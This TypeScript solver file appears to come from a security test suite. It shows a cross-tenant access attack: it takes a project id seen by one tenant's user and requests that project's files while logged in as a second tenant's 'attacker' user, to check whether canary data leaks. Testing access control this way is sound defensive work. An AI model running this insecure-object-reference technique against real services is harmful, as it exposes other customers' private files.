// Cross-tenant file listing: discover a tenant-A project id as its owner, then list that project's
// files as persona_b so the response carries foreign tenant canaries.
import type { SolverCtx } from '../../../../tests/helpers/site-matrix.ts'

export async function solve(ctx: SolverCtx): Promise<void> {
  const owner = await ctx.login('persona_a')
  const list = await ctx.fetch(ctx.path('listFiles'), { session: owner })
  const items = (list.json?.items ?? []) as Array<{ project: string }>
  const target = items.find((f) => f.project)
  if (!target) return
  const attacker = await ctx.login('persona_b')
  await ctx.fetch(ctx.path('listFiles', {}, { projectId: target.project }), { session: attacker })
}
